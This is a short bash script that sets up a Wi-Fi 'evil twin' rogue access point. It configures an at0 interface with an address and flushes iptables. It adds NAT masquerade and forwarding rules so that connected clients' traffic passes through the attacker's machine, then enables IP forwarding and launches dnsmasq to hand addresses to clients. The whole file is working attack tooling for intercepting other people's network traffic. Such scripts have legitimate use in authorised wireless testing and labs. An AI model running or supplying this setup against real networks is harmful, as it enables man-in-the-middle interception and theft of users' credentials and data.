#! /bin/bash

# this script sets up the evil twin

UPDATE=true
BRIDGE=wlan0 		# connected to internet, could be eth0 too
WLAN=wlan1			# monitor mode wirless adapter
MON=mon
WLANMON=$WLAN$MON
ESSID=TEST
CHANNEL=11

# Give the evil twin can access the internet.
echo -e "Configuring at0 interface"
ifconfig at0

# give at0 an ip address: 
ifconfig at0 10.0.0.1 up

# route all traffic through at0
# 	For bridged Ethernet Adapter
if [ "$BRIDGE" = "eth0" ]; then
	iptables --flush
	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	iptables --append FORWARD --in-interface at0 -j ACCEPT
else
	# Otherwise bridged Wireless Adapter
	iptables --flush
	iptables --table nat --append POSTROUTING --out-interface $BRIDGE -j MASQUERADE
	iptables --append FORWARD --in-interface at0 -j ACCEPT
fi

# enable port forwarding: 
echo -e "Enabling port forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

# evil twin is now setup, now need to allocate ip addresses to clients
dnsmasq -C /root/Desktop/eviltwin/dnsmasq.conf -d